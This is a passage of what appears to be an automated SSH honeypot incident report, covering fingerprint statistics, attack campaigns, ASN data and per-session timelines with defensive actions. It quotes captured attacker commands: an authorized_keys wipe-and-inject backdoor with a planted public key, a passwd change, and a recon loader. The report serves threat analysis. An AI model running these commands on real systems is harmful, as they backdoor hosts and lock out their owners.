| `bitcoind` | `bitcoind` | `45.148.10.240` | 2026-07-24T08:54:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **471** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 240 |
| OpenSSH | 86 |
| libssh | 39 |
| Paramiko (Python) | 18 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 133 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 94 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 81 | 78 |
| `f555226df196...` | Mirai/variant | 20 | 8 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 133 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 94 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 81 | 78 | Mirai/variant |
| `f555226df196...` | libssh | 20 | 8 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 5 | — |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 92 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "be123\n90mWOxqDlyKa\n90mWOxqDlyKa"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `58.216.53.130`, `213.131.64.123`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.84`, `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `200.63.168.90`, `45.117.177.47`, `222.107.156.227`, `178.27.90.142`, `182.93.7.194`, `198.23.177.233`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **171** |
| Unique ASNs | **89** |
| High-Risk ASNs | **77** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 13 | HIGH |
| `AS4766` | Korea Telecom | 10 | HIGH |
| `AS22773` | Cox Communications Inc. | 9 | HIGH |
| `AS46562` | Performive LLC | 9 | MEDIUM |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS213412` | ONYPHE SAS | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (357)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d3759f95de97

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:55 |
| **Last Seen** | 2026-07-24 04:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:55:06` | `cowrie.session.connect` |
| `2026-07-24 04:55:07` | `cowrie.client.version` |
| `2026-07-24 04:55:07` | `cowrie.client.kex` |
| `2026-07-24 04:55:10` | `cowrie.login.success` |
| `2026-07-24 04:55:13` | `cowrie.session.params` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.success` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:13` | `cowrie.command.input` |
| `2026-07-24 04:55:14` | `cowrie.log.closed` |
| `2026-07-24 04:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb07588eaff

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:55 |
| **Last Seen** | 2026-07-24 04:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:55:29` | `cowrie.session.connect` |
| `2026-07-24 04:55:29` | `cowrie.client.version` |
| `2026-07-24 04:55:30` | `cowrie.client.kex` |
| `2026-07-24 04:55:30` | `cowrie.login.success` |
| `2026-07-24 04:55:31` | `cowrie.session.params` |
| `2026-07-24 04:55:31` | `cowrie.command.input` |
| `2026-07-24 04:55:31` | `cowrie.log.closed` |
| `2026-07-24 04:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c88448b920d8

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-07-24 04:56 |
| **Last Seen** | 2026-07-24 04:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:56:19` | `cowrie.session.connect` |
| `2026-07-24 04:56:20` | `cowrie.client.version` |
| `2026-07-24 04:56:20` | `cowrie.client.kex` |
| `2026-07-24 04:56:21` | `cowrie.login.success` |
| `2026-07-24 04:56:21` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-570ddf31610b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:57 |
| **Last Seen** | 2026-07-24 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:57:07` | `cowrie.session.connect` |
| `2026-07-24 04:57:07` | `cowrie.client.version` |
| `2026-07-24 04:57:07` | `cowrie.client.kex` |
| `2026-07-24 04:57:08` | `cowrie.login.success` |
| `2026-07-24 04:57:08` | `cowrie.session.params` |
| `2026-07-24 04:57:08` | `cowrie.command.input` |
| `2026-07-24 04:57:08` | `cowrie.log.closed` |
| `2026-07-24 04:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb935c92e79

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:57 |
| **Last Seen** | 2026-07-24 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:57:22` | `cowrie.session.connect` |
| `2026-07-24 04:57:23` | `cowrie.client.version` |
| `2026-07-24 04:57:23` | `cowrie.client.kex` |
| `2026-07-24 04:57:26` | `cowrie.login.success` |
| `2026-07-24 04:57:28` | `cowrie.session.params` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.success` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:28` | `cowrie.command.input` |
| `2026-07-24 04:57:29` | `cowrie.log.closed` |
| `2026-07-24 04:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c7525426142

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 04:57 |
| **Last Seen** | 2026-07-24 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:57:30` | `cowrie.session.connect` |
| `2026-07-24 04:57:30` | `cowrie.client.version` |
| `2026-07-24 04:57:30` | `cowrie.client.kex` |
| `2026-07-24 04:57:31` | `cowrie.login.success` |
| `2026-07-24 04:57:31` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:57:31` | `cowrie.direct-tcpip.data` |
| `2026-07-24 04:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4fa59804ee3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:58 |
| **Last Seen** | 2026-07-24 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:58:51` | `cowrie.session.connect` |
| `2026-07-24 04:58:51` | `cowrie.client.version` |
| `2026-07-24 04:58:51` | `cowrie.client.kex` |
| `2026-07-24 04:58:51` | `cowrie.login.success` |
| `2026-07-24 04:58:52` | `cowrie.session.params` |
| `2026-07-24 04:58:52` | `cowrie.command.input` |
| `2026-07-24 04:58:52` | `cowrie.log.closed` |
| `2026-07-24 04:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d8a67c5c845

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 04:59 |
| **Last Seen** | 2026-07-24 04:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:59:43` | `cowrie.session.connect` |
| `2026-07-24 04:59:45` | `cowrie.client.version` |
| `2026-07-24 04:59:45` | `cowrie.client.kex` |
| `2026-07-24 04:59:48` | `cowrie.login.success` |
| `2026-07-24 04:59:49` | `cowrie.session.params` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.success` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:49` | `cowrie.command.input` |
| `2026-07-24 04:59:50` | `cowrie.log.closed` |
| `2026-07-24 04:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-301062485121

| Field | Detail |
|---|---|
| **Source IP** | `58.216.53[.]130` |
| **First Seen** | 2026-07-24 05:00 |
| **Last Seen** | 2026-07-24 05:01 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "be123\n90mWOxqDlyKa\n90mWOxqDlyKa"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:00:15` | `cowrie.session.connect` |
| `2026-07-24 05:00:15` | `cowrie.client.version` |
| `2026-07-24 05:00:15` | `cowrie.client.kex` |
| `2026-07-24 05:00:18` | `cowrie.login.success` |
| `2026-07-24 05:00:19` | `cowrie.session.params` |
| `2026-07-24 05:00:19` | `cowrie.command.input` |
| `2026-07-24 05:00:19` | `cowrie.command.failed` |
| `2026-07-24 05:00:20` | `cowrie.log.closed` |
| `2026-07-24 05:00:20` | `cowrie.session.params` |
| `2026-07-24 05:00:20` | `cowrie.command.input` |
| `2026-07-24 05:00:21` | `cowrie.session.file_download` |
| `2026-07-24 05:00:21` | `cowrie.log.closed` |
| `2026-07-24 05:00:50` | `cowrie.session.params` |
| `2026-07-24 05:00:50` | `cowrie.command.input` |
| `2026-07-24 05:00:51` | `cowrie.log.closed` |
| `2026-07-24 05:00:51` | `cowrie.session.params` |
| `2026-07-24 05:00:51` | `cowrie.command.input` |
| `2026-07-24 05:00:51` | `cowrie.command.input` |
| `2026-07-24 05:00:51` | `cowrie.command.failed` |
| `2026-07-24 05:00:52` | `cowrie.log.closed` |
| `2026-07-24 05:00:53` | `cowrie.session.params` |
| `2026-07-24 05:00:53` | `cowrie.command.input` |
| `2026-07-24 05:00:53` | `cowrie.log.closed` |
| `2026-07-24 05:00:54` | `cowrie.session.params` |
| `2026-07-24 05:00:54` | `cowrie.command.input` |
| `2026-07-24 05:00:54` | `cowrie.log.closed` |
| `2026-07-24 05:00:55` | `cowrie.session.params` |
| `2026-07-24 05:00:55` | `cowrie.command.input` |
| `2026-07-24 05:00:55` | `cowrie.log.closed` |
| `2026-07-24 05:00:56` | `cowrie.session.params` |
| `2026-07-24 05:00:56` | `cowrie.command.input` |
| `2026-07-24 05:00:56` | `cowrie.command.input` |
| `2026-07-24 05:00:57` | `cowrie.log.closed` |
| `2026-07-24 05:00:58` | `cowrie.session.params` |
| `2026-07-24 05:00:58` | `cowrie.command.input` |
| `2026-07-24 05:00:58` | `cowrie.log.closed` |
| `2026-07-24 05:00:59` | `cowrie.session.params` |
| `2026-07-24 05:00:59` | `cowrie.command.input` |
| `2026-07-24 05:01:00` | `cowrie.log.closed` |
| `2026-07-24 05:01:00` | `cowrie.session.params` |
| `2026-07-24 05:01:00` | `cowrie.command.input` |
| `2026-07-24 05:01:01` | `cowrie.log.closed` |
| `2026-07-24 05:01:02` | `cowrie.session.params` |
| `2026-07-24 05:01:02` | `cowrie.command.input` |
| `2026-07-24 05:01:02` | `cowrie.log.closed` |
| `2026-07-24 05:01:03` | `cowrie.session.params` |
| `2026-07-24 05:01:03` | `cowrie.command.input` |
| `2026-07-24 05:01:03` | `cowrie.log.closed` |
| `2026-07-24 05:01:04` | `cowrie.session.params` |
| `2026-07-24 05:01:04` | `cowrie.command.input` |
| `2026-07-24 05:01:05` | `cowrie.log.closed` |
| `2026-07-24 05:01:05` | `cowrie.session.params` |
| `2026-07-24 05:01:05` | `cowrie.command.input` |
| `2026-07-24 05:01:06` | `cowrie.log.closed` |
| `2026-07-24 05:01:07` | `cowrie.session.params` |
| `2026-07-24 05:01:07` | `cowrie.command.input` |
| `2026-07-24 05:01:07` | `cowrie.log.closed` |
| `2026-07-24 05:01:08` | `cowrie.session.params` |
| `2026-07-24 05:01:08` | `cowrie.command.input` |
| `2026-07-24 05:01:08` | `cowrie.log.closed` |
| `2026-07-24 05:01:09` | `cowrie.session.params` |
| `2026-07-24 05:01:09` | `cowrie.command.input` |
| `2026-07-24 05:01:09` | `cowrie.log.closed` |
| `2026-07-24 05:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.216.53[.]130` to AbuseIPDB if not already reported
- [ ] Block `58.216.53[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ccaf0f233a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:00 |
| **Last Seen** | 2026-07-24 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:00:38` | `cowrie.session.connect` |
| `2026-07-24 05:00:38` | `cowrie.client.version` |
| `2026-07-24 05:00:38` | `cowrie.client.kex` |
| `2026-07-24 05:00:38` | `cowrie.login.success` |
| `2026-07-24 05:00:39` | `cowrie.session.params` |
| `2026-07-24 05:00:39` | `cowrie.command.input` |
| `2026-07-24 05:00:39` | `cowrie.log.closed` |
| `2026-07-24 05:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6684d8df325b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:02 |
| **Last Seen** | 2026-07-24 05:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:02:08` | `cowrie.session.connect` |
| `2026-07-24 05:02:08` | `cowrie.client.version` |
| `2026-07-24 05:02:08` | `cowrie.client.kex` |
| `2026-07-24 05:02:11` | `cowrie.login.success` |
| `2026-07-24 05:02:13` | `cowrie.session.params` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.success` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:13` | `cowrie.command.input` |
| `2026-07-24 05:02:14` | `cowrie.log.closed` |
| `2026-07-24 05:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5215f7cb283

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:02 |
| **Last Seen** | 2026-07-24 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:02:22` | `cowrie.session.connect` |
| `2026-07-24 05:02:22` | `cowrie.client.version` |
| `2026-07-24 05:02:22` | `cowrie.client.kex` |
| `2026-07-24 05:02:22` | `cowrie.login.success` |
